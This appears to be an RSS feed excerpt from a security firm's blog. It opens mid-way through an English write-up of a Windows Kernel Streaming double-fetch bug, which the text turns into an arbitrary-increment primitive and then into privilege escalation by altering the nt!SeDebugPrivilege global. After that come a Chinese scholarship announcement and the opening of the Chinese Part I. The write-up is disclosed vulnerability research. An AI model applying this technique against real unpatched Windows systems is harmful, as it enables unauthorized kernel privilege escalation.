            &amp;amp;BytesReturned);  
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you want to provide a kernel object to register an event, then the flag given in the IOCTL for &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure&quot;&gt;KSEVENT&lt;/a&gt; must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt; at [3]. However, at [4], where the vulnerability is triggered, it must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;, and it is impossible to directly provide a kernel object as we might have expected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; also uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Neither I/O&lt;/code&gt; to transmit data. It also presents a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Double Fetch&lt;/code&gt; issue &lt;strong&gt;again&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure above, we can set the flag to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt; before calling IOCTL. When checking, it will handle it with  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;. Before the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; call, we can change the flag to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This way, we can successfully trigger the vulnerability and construct a specific kernel object to register the event.&lt;/p&gt;

&lt;h3 id=&quot;trigger-the-event&quot;&gt;Trigger the event&lt;/h3&gt;
&lt;p&gt;When would it use the kernel object that you constructed? When an event is triggered, ks will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!ksGenerateEvent&lt;/code&gt; through DPC. At this point, it will determine how to handle your event based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NotificationType&lt;/code&gt; you specified.&lt;/p&gt;

&lt;p&gt;Let’s take a look at KsGenerateEvent&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)
{

  switch ( EventEntry-&amp;gt;NotificationType )
  {
    case KSEVENTF_DPC:
      ...
      if ( !KeInsertQueueDpc(EventEntry-&amp;gt;EventData-&amp;gt;Dpc.Dpc, EventEntry-&amp;gt;EventData, 0LL) )
        _InterlockedAdd(&amp;amp;EventEntry-&amp;gt;EventData-&amp;gt;EventObject.Increment, 0xFFFFFFFF); //--------[6]
      ...
    case KSEVENTF_KSWORKITEM:
      ...
      KsIncrementCountedWorker(eventdata-&amp;gt;KsWorkItem.KsWorkerObject); //-----------[7]

  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this point, there are multiple ways to exploit this. The most straightforward method is to directly construct a DPC structure and queue a DPC to achieve arbitrary kernel code execution, which corresponds to the code snippet at [6]. However, the IRQL when calling KsGenerateEvent is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt;, making it very difficult to construct a DPC object in User space, and the exploitation process will encounter many issues.&lt;/p&gt;

&lt;p&gt;Therefore, we opt for an alternative route using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTF_KSWORKITEM&lt;/code&gt; at [7]. This method involves passing in a kernel address and manipulating it to be recognized as a pointer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSWORKITEM&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It can achieve an arbitrary kernel address increment by one. The entire process is illustrated in the diagram below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt;, after constructing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTDATA&lt;/code&gt; to point to a kernel memory address, ks will handle it as a kernel object and register the specified event.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When triggered, ks will increment the content at our provided memory address. Therefore, we have a kernel arbitrary increment primitive here.&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-increment-primitive-to-eop&quot;&gt;Arbitrary increment primitive to EoP&lt;/h3&gt;
&lt;p&gt;From arbitrary increment primitive to EoP, there are many methods that can be exploited, among which the most well-known are &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abuse token privilege&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing&lt;/code&gt;&lt;/a&gt;. Initially, it seemed like this would be the end of it.&lt;/p&gt;

&lt;p&gt;However, both of these methods have certain limitations in this situation:&lt;/p&gt;

&lt;h4 id=&quot;abuse-token-privilege&quot;&gt;Abuse token Privilege&lt;/h4&gt;
&lt;p&gt;If we use the method of abusing token privilege for EoP, the key lies of the technique in overwriting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Present&lt;/code&gt;. Since our vulnerability can only be incremented by one at a time, both fields need to be written to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;. The default values for these two fields are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602880000&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt;, which need to be changed to 0x602&lt;strong&gt;9&lt;/strong&gt;80000 and 0x&lt;strong&gt;9&lt;/strong&gt;00000. This means each field needs to be written 0x10 times, totaling 0x20 writes. Each write requires a race condition, which takes times and significantly reduces stability.&lt;/p&gt;

&lt;h4 id=&quot;ioring&quot;&gt;IoRing&lt;/h4&gt;
&lt;p&gt;Using IoRing to achieve arbitrary writing might be a simpler method. To achieve arbitrary write, you just need to overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffersCount&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffers&lt;/code&gt;. However, a problem arises.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When triggering the arbitrary increment, if the original value is 0, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsQueueWorkItem&lt;/code&gt;, where some corresponding complex processing will occur, leading to BSoD. The exploitation method of IoRing happens to encounter this situation…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Is it really impossible to exploit it stably?&lt;/p&gt;

&lt;h4 id=&quot;lets-find-a-new-way-&quot;&gt;Let’s find a new way !&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;When traditional exploitation methods hit a roadblock, it might be worthwhile to dive deeper into the core mechanics of the technique. You may unexpectedly discover new approaches along the way.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After several days of contemplation, we decided to seek a new approach. However, starting from scratch might take considerable time and may not yield results. Therefore, we chose to derive new inspiration from two existing methods. First, let’s look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abusing token privilege&lt;/code&gt;. The key aspect here is exploiting a vulnerability to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, allowing us to open high-privilege processes such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winlogon&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The question arises: why does having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; allow you to open high-privilege processes?&lt;/p&gt;

&lt;p&gt;We need to take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!PsOpenProcess&lt;/code&gt; first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From this code snippet, we can see that when we open the process, the kernel will use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck&quot;&gt;SeSinglePrivilegeCheck&lt;/a&gt; to check if you have SeDebugPrivilege. If you have it, you will be granted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt; permission, allowing you to perform any action on any process except PPL. As the name implies, it is intended for debugging purposes. However, it is worth noting that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is a global variable in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid&quot;&gt;LUID&lt;/a&gt; structure that was initialized at system startup. The actual value is 0x14, indicating which bit in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges.Present&lt;/code&gt; fields represent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;. Therefore, when we use NtOpenProcess, the system reads the value in this global variable&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is obtained, it will be used to inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges&lt;/code&gt; field in the Token to see if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Present&lt;/code&gt; fields are set. For &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, it will check the 0x14 bit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there is an interesting thing…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The global variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; is located in a writable section!&lt;/p&gt;

&lt;p&gt;A new idea was born.&lt;/p&gt;

&lt;h4 id=&quot;make-abusing-token-privilege-great-again-&quot;&gt;Make abusing token privilege great again !&lt;/h4&gt;
&lt;p&gt;By default, a normal user will have only a limited number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileges&lt;/code&gt;, as shown in this diagram.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can notice that in most cases, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; is enabled. At this point, we can look at the initialization part and find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; represents the value 0x17.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What would happen if we use the vulnerability to change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; from 0x14 to 0x17?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtOpenProcess&lt;/code&gt; flow, it will first get the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt;, and at this time the obtained value is 0x17 (SeChangeNotifyPrivilege)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next check will verify the current process token using 0x17 to see if it has this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt;. However, normal users generally have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;, so even if you don’t have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;, you will still pass the check and obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt;. In other words, anyone with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt; can open a high-privilege process except PPL.&lt;/p&gt;

&lt;p&gt;Furthermore, by using the vulnerability mentioned above, we can change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; from &lt;strong&gt;0x14 to 0x17&lt;/strong&gt;. Since the original value is not 0, it will not be affected by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsQueueWorkItem&lt;/code&gt;, making it highly suitable for our purposes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we can open a high-privilege process, the privilege escalation method is the same as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abuse token privilege&lt;/code&gt; approach so that we won’t elaborate on that here. Ultimately, we successfully achieved EoP on Windows 11 23H2 by again utilizing Proxying to kernel.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m2TNVDgz7CI?si=YJQ9_u7xoyVt1wRm&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;remark&quot;&gt;Remark&lt;/h4&gt;
&lt;p&gt;Actually, this technique also applies to other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SeTcbPrivilege = 0x7&lt;/li&gt;
  &lt;li&gt;SeTakeOwnershipPrivilege = 0x9&lt;/li&gt;
  &lt;li&gt;SeLoadDriverPrivilege = 0xa&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;

&lt;p&gt;The focus of these two articles is primarily on how we analyze past vulnerabilities to discover new ones, how we gain new ideas from previous research, find new exploitation methods, new vulnerabilities, and new attack surfaces.&lt;/p&gt;

&lt;p&gt;There may still be many security issues of this bug class, and they might not be limited to Kernel Streaming and &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt;. I believe this is a design flaw in Windows, and if we search carefully, we might find more vulnerabilities.&lt;/p&gt;

&lt;p&gt;For this type of vulnerability, you need to pay attention to the timing of setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt;. If it is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; and then user input is used, issues may arise. Moreover, this type of vulnerability is often very exploitable.&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, I believe there are quite a few potential security vulnerabilities. There are also many components like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hdaudio.sys&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Usbvideo.sys&lt;/code&gt; that might be worth examining and are suitable places for fuzzing. If you are a kernel driver developer, it is best not to only check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; . There might still be issues within the Windows architecture. Finally, I strongly recommend everyone to update Windows to the latest version as soon as possible.&lt;/p&gt;

&lt;h2 id=&quot;is-that-the-end-of-it-&quot;&gt;Is that the end of it ?&lt;/h2&gt;
&lt;p&gt;Apart from proxy-based vulnerabilities, we have also identified many other bug classes, allowing us to discover over 20 vulnerabilities in Kernel Streaming. Some of these vulnerabilities are quite unique, so stay tuned for Part III.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/</link>
                <guid>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en</guid>
                <pubDate>Sat, 05 Oct 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 全國資訊安全獎學金、資安教育活動贊助計畫即日起開放報名</title>
                <description>&lt;p&gt;繼輔仁大學及國立臺灣科技大學戴夫寇爾資訊安全獎學金頒布後，我們很高興地宣佈，2024 年度「全國資訊安全獎學金」及「資安教育活動贊助計畫」於即日起開放報名。&lt;/p&gt;

&lt;p&gt;自 2012 年創立之初，DEVCORE 即秉持著提升台灣資安競爭力、讓世界更安全的初衷，將人才培育視為己任，透過參與教育部資安人才培育計畫、創辦 DEVCORE 實習生計畫、啟動戴夫寇爾資安獎學金、辦理資安教育活動贊助計畫等方式，協助資安人才茁壯成長。&lt;/p&gt;

&lt;h3 id=&quot;devcore-全國資訊安全獎學金&quot;&gt;DEVCORE 全國資訊安全獎學金&lt;/h3&gt;

&lt;p&gt;DEVCORE 於 2020 年首次舉辦「戴夫寇爾資安獎學金計畫」，原為感念過去學生時代受到的多方資源及鼓勵，獎學金頒發範圍為經營團隊母校的輔仁大學及國立臺灣科技大學，後為培育更多有志青年學子，擴大獎學金範圍，開放全國各地學生報名申請，期待能推廣「駭客思維」、強化資安技能，並幫助在學學生了解資安產業生態及現況、降低學用落差，未來成為新一代的攻擊型資安人才，為資安產業注入新活力。&lt;/p&gt;

&lt;p&gt;「戴夫寇爾全國資訊安全獎學金」歡迎所有在資訊安全領域有出眾研究成果的學生報名申請，有意申請者須提出學習資安的動機與歷程，並繳交資安研究或比賽成果，我們將從中擇優選取 10 名，獲選者可獲最高 2 萬元的研究補助。詳細申請辦法如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;申請資格：全國各大專院校學生皆可以申請。&lt;/li&gt;
  &lt;li&gt;獎學金金額/名額：每年度取 10 名，每名可獲得獎學金新台幣 20,000 元整，共計 20 萬元。如報名踴躍，我們將視申請狀況增加名額。&lt;/li&gt;
  &lt;li&gt;申請時程：
    &lt;ul&gt;
      &lt;li&gt;2024/9/6 官網公告獎學金計畫資訊&lt;/li&gt;
      &lt;li&gt;2024/9/6 - 2024/10/3 開放收件&lt;/li&gt;
      &lt;li&gt;2024/10/31 公布審查結果，並將於 11 至 12 月間頒發獎學金&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;申請辦法：
    &lt;ul&gt;
      &lt;li&gt;請依⽂件檢核表項次順序排列已附⽂件，彙整為⼀份 PDF 檔案，寄⾄ &lt;a href=&quot;mailto:scholarship@devco.re&quot;&gt;scholarship@devco.re&lt;/a&gt;。&lt;/li&gt;
      &lt;li&gt;信件主旨及 PDF 檔案名稱請符合以下格式：[全國獎學⾦申請] 學校名稱_學號_姓名（範例：[全國獎學⾦申請] 輔仁⼤學_B11100000_王⼩美）。&lt;/li&gt;
      &lt;li&gt;請申請⼈⾃我檢核並於申請⼈檢核區勾選已附⽂件，若⽂件不⿑或未確實勾選恕不受理申請。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;須檢附文件：
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/戴夫寇爾全國獎學金申請表.pdf&quot;&gt;本獎學⾦申請表&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;在學證明&lt;/li&gt;
      &lt;li&gt;最近⼀學期成績單&lt;/li&gt;
      &lt;li&gt;學習資訊安全之動機與歷程⼼得⼀篇：字數 500 - 2000 字&lt;/li&gt;
      &lt;li&gt;資訊安全技術相關研究成果：至少須從以下六項目中擇一繳交，包含研討會投稿、漏洞獎勵計畫、弱點研究、資訊安全比賽、資安工具研究、技術文章發表等成果&lt;/li&gt;
      &lt;li&gt;社群經營成果：至少須從以下兩項目中擇一繳交，包含校園資安社團、公開資安社群等&lt;/li&gt;
      &lt;li&gt;推薦函：導師、系主任、其他教授或業界⼈⼠推薦函，⾄少須取得兩封以上推薦函&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;devcore-資安教育活動贊助計劃&quot;&gt;DEVCORE 資安教育活動贊助計劃&lt;/h3&gt;

&lt;p&gt;今年我們也將持續贊助資安教育活動，提供經費予資安相關之社群、社團辦理各項活動，凝聚台灣資安社群，加速培育台灣的資安新銳。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;申請資格：與資安議題相關之社群、社團活動，請由 1 位社團代表人填寫資料。&lt;/li&gt;
  &lt;li&gt;贊助金額：依各社團活動需求及與 DEVCORE 團隊討論而定，每次最高補助金額為新台幣 20,000 元整。&lt;/li&gt;
  &lt;li&gt;申請時程：如欲申請此計畫的社團或活動，請於 2024/10/31 前透過以下連結填寫初步資料，我們將於 30 日內通知符合申請資格者提供進一步資料，不符合資格者將不另行通知。&lt;/li&gt;
  &lt;li&gt;申請連結：&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot; target=&quot;_blank&quot;&gt;DEVCORE 2024 年資安教育活動贊助調查&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;須提供資料：
    &lt;ul&gt;
      &lt;li&gt;申請資格：申請人需以各資安社群或社團名義提出申請。&lt;/li&gt;
      &lt;li&gt;聯絡電子郵件&lt;/li&gt;
      &lt;li&gt;想要辦理的活動類型&lt;/li&gt;
      &lt;li&gt;想要辦理的活動方式&lt;/li&gt;
      &lt;li&gt;活動總預算&lt;/li&gt;
      &lt;li&gt;預計需要贊助金額&lt;/li&gt;
      &lt;li&gt;代表人姓名、連絡電話&lt;/li&gt;
      &lt;li&gt;團體名稱&lt;/li&gt;
      &lt;li&gt;團體單位網址&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;注意事項：
    &lt;ul&gt;
      &lt;li&gt;申請案審核將經過 DEVCORE 內部審核機制，並保有最終核決權。&lt;/li&gt;
      &lt;li&gt;本問卷僅供初步意願蒐集用途，符合申請資格者，DEVCORE 將於 30 日內通知提供進一步資料供審核，其餘將不另行通知。&lt;/li&gt;
      &lt;li&gt;DEVCORE 保有修改、暫停或終止本贊助計畫之權利。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens/</link>
                <guid>https://devco.re/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens</guid>
                <pubDate>Fri, 06 Sep 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在過去的幾十年中 Windows Kernel 的漏洞層出不窮，熱門的攻擊面逐漸從 Win32k 慢慢轉移到 CLFS (Common Log File System) 上。微軟也持續且積極地修補這些漏洞，使得這些元件越來越安全。而下一個熱門的目標會是哪個元件呢？去年開始，MSKSSRV (Microsoft Kernel Streaming Service) 成為駭客喜愛的目標之一。這個驅動程式小到可以在幾天內完成分析。這是否意味著可能不太會有新的漏洞了？&lt;/p&gt;

&lt;p&gt;在這篇研究將講述一個長期被忽視的攻擊面，讓我們在兩個月內就找出了超過 10 個漏洞。此外，也將深入探討了一種 Proxy-Based 的邏輯漏洞類型，使我們可以忽略掉大多數的檢查，最終成功在 Pwn2Own Vancouver 2024 中，攻下 Windows 11 的項目。&lt;/p&gt;

&lt;p&gt;這份研究將分成數個部分來撰寫，分別講述不同的漏洞類型及漏洞型態，亦發表於 &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/&quot;&gt;HITCON CMT 2024&lt;/a&gt; 中。&lt;/p&gt;

&lt;h2 id=&quot;start-from-mskssrv&quot;&gt;Start from MSKSSRV&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;對於一項漏洞研究來說，從歷史的漏洞看起，是不可或缺的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;起初，我們為了挑戰 Pwn2Own Vancouver 2024 中 Windows 11 的項目，開始從過去的 Pwn2Own 以及近期 in-the-wild 的漏洞中開始審視，尋找可能的攻擊面。沿著歷史軌跡可以得知，過去主要負責 GDI 相關操作的 Win32K 一直是個很熱門的目標，從 2018 年以來，CLFS (Common Log File System) 也漸漸成為了熱門目標之一。這兩個元件都非常複雜，並且直到現在仍然有不少新漏洞出現，但要熟悉這兩個元件需要花不少時間，同時也有許多研究員在看這兩個元件，所以最終我們沒有先選擇分析他們。&lt;/p&gt;

&lt;p&gt;去年 &lt;a href=&quot;https://www.synacktiv.com/en&quot;&gt;Synacktiv&lt;/a&gt; 在 Pwn2Own 2023 中，使用 MSKSSRV 的&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360&quot;&gt;漏洞&lt;/a&gt;成功攻下 Windows 11 後，便有不少人往這個元件開始看起，短時間內就又出現了&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802&quot;&gt;第二個漏洞 CVE-2023-36802&lt;/a&gt;，這時 &lt;a href=&quot;https://x.com/chompie1337&quot;&gt;chompie&lt;/a&gt; 也發表了一篇&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;非常詳細的文章&lt;/a&gt;，講述這個漏洞成因及其利用細節。由於這個元件非常的小，只看檔案大小約略只有 72 KB，可能認真看個幾天就可以全部看完，因此我們便挑了 MSKSSRV 來做歷史漏洞分析，看看是否有機會抓出其他漏洞。&lt;/p&gt;

&lt;p&gt;接下來我們會提一下這兩個漏洞，但不會著墨過多。&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-29360---logical-vulnerability&quot;&gt;CVE-2023-29360 - logical vulnerability&lt;/h3&gt;
